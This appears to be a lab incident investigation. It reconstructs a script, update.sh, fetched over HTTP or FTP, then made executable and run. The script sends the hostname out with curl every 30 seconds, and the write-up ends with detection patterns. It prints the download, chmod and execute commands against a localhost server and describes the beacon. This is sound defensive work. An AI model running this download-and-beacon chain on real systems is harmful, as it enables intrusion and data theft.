# Suspicious File Download Activity - Investigation

## Objective

Investigate suspicious activity identified during telemetry analysis.

The purpose of this phase is to:

* correlate evidence across telemetry sources
* reconstruct activity timelines
* identify attacker behavior patterns
* determine likely objectives
* identify suspicious execution chains
* assess whether observed activity represents a potential attack

This phase focuses on behavioral reconstruction and evidence correlation.

---

# Investigation Scope

Two delivery variants were investigated:

1. HTTP-based payload delivery
2. FTP-based payload delivery

Although delivery mechanisms differ, both variants ultimately execute the same payload and produce nearly identical post-execution behavior.

The investigation therefore focuses on:

* payload acquisition
* payload execution
* post-execution activity
* recurring communications

---

# Variant 1 Investigation

## Correlated Evidence

The following evidence was observed:

### Auditd

```text
curl -> download update.sh
chmod -> modify permissions
bash -> execute update.sh
hostname
curl
sleep
```

### TCPDump

```text
GET /update.sh
HTTP 200 OK

GET /heartbeat
GET /heartbeat
GET /heartbeat
...
```

### Listener Logs

```text
GET /update.sh

GET /heartbeat
GET /heartbeat
GET /heartbeat
...
```

---

## Activity Reconstruction

The sequence of events can be reconstructed with high confidence.

### Stage 1 - External File Retrieval

A user initiated:

```bash
curl http://127.0.0.1:8080/update.sh
```

Network telemetry confirms retrieval of a remote script.

The retrieved file was saved locally.

---

### Stage 2 - Execution Preparation

Immediately before execution:

```bash
chmod +x update.sh
```

The file was intentionally prepared to run as an executable script.

---

### Stage 3 - Script Execution

The downloaded script was launched through:

```bash
bash update.sh
```

At this point the file transitions from a passive artifact into an active process.

---

### Stage 4 - Host Discovery

Immediately after execution:

```bash
hostname
```

is spawned by the script.

The script appears to collect basic host identification information.

---

### Stage 5 - External Communication

The script subsequently launches:

```bash
curl
```

to contact an external service.

The request includes:

```text
host=bunny-VirtualBox
```

within the URI.

This indicates that collected host information is being transmitted externally.

---

### Stage 6 - Repetition

The sequence:

```text
hostname
curl
sleep
```

repeats continuously.

Observed interval:

```text
~30 seconds
```

The timing remains consistent throughout the observation period.

---

# Variant 2 Investigation

## Correlated Evidence

### Auditd

```text
ftp
chmod
bash update.sh
hostname
curl
sleep
```

### TCPDump

```text
FTP session establishment

HTTP heartbeat traffic
```

### Payload Metadata

```text
update.sh appears in home directory
```

---

## Activity Reconstruction

Although direct file transfer visibility is weaker than Variant 1, sufficient evidence exists to reconstruct the activity.

---

### Stage 1 - External File Acquisition

An FTP client establishes a connection to a remote service.

After the FTP session:

```text
update.sh
```

appears on disk.

The appearance of the file directly follows the FTP activity.

---

### Stage 2 - Execution Preparation

The file permissions are modified:

```bash
chmod +x update.sh
```

making the file executable.

---

### Stage 3 - Script Execution

The file is launched:

```bash
bash ./update.sh
```

---

### Stage 4 - Host Discovery

The script executes:

```bash
hostname
```

to gather host identification information.

---

### Stage 5 - External Communication

The script launches:

```bash
curl
```

which communicates with an external service.

The request contains host identification information.

---

### Stage 6 - Repetition

The same sequence repeats every approximately 30 seconds.

Behavior remains consistent across the observation window.

---

# Cross-Variant Correlation

## Common Behaviors

Despite different delivery mechanisms, both variants exhibit the same operational behavior after payload acquisition.

Common observations:

```text
Acquire file
      ↓
Modify permissions
      ↓
Execute script
      ↓
Collect hostname
      ↓
Transmit hostname
      ↓
Sleep
      ↓
Repeat
```

The operational logic remains unchanged.

Only the acquisition method differs.

---

# Suspicious Process Chain Analysis

## Variant 1

```text
curl
    ↓
update.sh
    ↓
bash
    ├── hostname
    ├── curl
    └── sleep
```

---

## Variant 2

```text
ftp
    ↓
update.sh
    ↓
bash
    ├── hostname
    ├── curl
    └── sleep
```

---

## Why These Chains Matter

Several characteristics increase investigative interest:

### Newly Acquired File Execution

The script is executed shortly after being obtained.

This reduces the likelihood that the file represents long-standing legitimate software.

---

### Permission Modification Before Execution

The observed pattern:

```text
download
    ↓
chmod
    ↓
execute
```

is frequently associated with script deployment workflows.

---

### Network-Capable Child Processes

The executed script spawns:

```text
curl
```

creating outbound communications.

The script therefore performs more than local processing.

---

### Recurring Activity

The communication pattern repeats at fixed intervals.

The consistency suggests automation.

---

# Potential Attacker Workflow

Based on correlated evidence, the following workflow is plausible.

```text
Attacker hosts payload
          ↓
Victim retrieves payload
          ↓
Payload written to disk
          ↓
Payload made executable
          ↓
Payload executed
          ↓
Host information collected
          ↓
Information transmitted
          ↓
Periodic communication established
```

No evidence of privilege escalation was observed.

No evidence of persistence was observed.

No evidence of lateral movement was observed.

However, the activity demonstrates successful payload delivery, execution, and recurring outbound communication.

---

# Investigation Conclusions

The evidence supports the conclusion that:

1. An externally obtained script was executed.
2. The script performs host identification activity.
3. The script communicates externally after execution.
4. Communication occurs repeatedly at fixed intervals.
5. The behavior is automated rather than interactive.
6. Both delivery methods ultimately produce the same operational outcome.
7. The observed workflow resembles a payload delivery and callback mechanism.

The activity warrants escalation for threat mapping and detection engineering.

---

# Detection Takeaways

The investigation identified several high-value behavioral patterns.

## File Acquisition Followed By Execution

```text
curl -> bash
ftp -> bash
```

A file retrieval utility is followed by script execution.

---

## Permission Modification Followed By Execution

```text
chmod
    ↓
bash
```

A newly acquired file becomes executable and is subsequently launched.

---

## Host Discovery Followed By Communication

```text
hostname
    ↓
curl
```

Host information gathering immediately precedes outbound communication.

---

## Script-Controlled Network Activity

```text
bash
    ↓
curl
```

The network activity originates from a script execution chain.

---

## Periodic Outbound Communications

```text
curl
sleep
curl
sleep
curl
sleep
```

The communication pattern is recurring and automated.

---

## High-Value Correlation Opportunities

The strongest behavioral correlations identified are:

```text
download
    ↓
chmod
    ↓
execution
```

```text
execution
    ↓
hostname
    ↓
network communication
```

```text
network communication
    ↓
fixed sleep interval
    ↓
network communication
```

These behavioral sequences provide the strongest candidates for subsequent threat mapping and detection development.
